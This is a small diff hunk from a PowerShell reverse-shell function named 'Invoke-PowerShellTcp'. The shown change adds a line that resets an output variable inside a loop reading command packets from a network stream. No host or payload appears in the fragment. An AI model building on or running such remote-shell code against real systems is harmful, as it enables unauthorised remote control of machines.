@@ -144,6 +144,7 @@ function Invoke-PowerShellTcp
     $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
     $data = ""
     while ( $packet = (Read-ShellPacket  $stream) ) {
+        $output = ""
         if ($packet.msg_type -eq "COMMAND") {
             $data = $packet.data
 
